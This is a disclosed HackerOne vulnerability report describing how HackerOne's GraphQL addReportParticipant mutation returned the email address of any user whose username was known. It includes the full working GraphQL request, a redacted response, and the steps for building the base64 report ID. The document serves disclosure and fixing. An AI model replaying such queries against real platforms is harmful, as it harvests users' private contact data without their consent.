# HackerOne Report #792927 — Email address of any user can be queried on Report Invitation GraphQL type when username is known

- **Program:** unknown
- **Severity:** high
- **Weakness:** Improper Authorization (n/a)
- **State:** Closed
- **Reporter:** msdian7
- **Reported:** n/a
- **Disclosed:** 2020-02-20T16:58:04.631Z
- **Bounty:** n/a

## Full disclosure

**Summary:**
Email  id  of all hackerone users disclosure

**Description:**
There is an flaw , with that i can get all hackerone users email id 

### Steps To Reproduce

1. Invoke the below graphql call

POST /graphql HTTP/1.1

```{"query":"mutation Revoke_credential_mutation($input_0:AddReportParticipantInput!) {addReportParticipant(input:$input_0) {clientMutationId,...F1}}  fragment F1 on AddReportParticipantPayload {clientMutationId,was_successful,errors{nodes{message}},invitation{email,token}}","variables":{"input_0":{"report_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYzNzE=","email":"██████████","username":"jobert"}}}```

you will get below response

```
{"data":{"addReportParticipant":{"clientMutationId":null,"was_successful":true,"errors":{"nodes":[]},"invitation":{"email":"████","token":null}}}}
```

2.  to reproduce from your account, create one test program, and create one report for that program, get that report id 
gid://hackerone/Report/626371 (here 626371 my test program's report id)  convert it into base 64, replace that id with the "report_id" in the above graphql query 
3.   Done

## Impact

PII disclosed
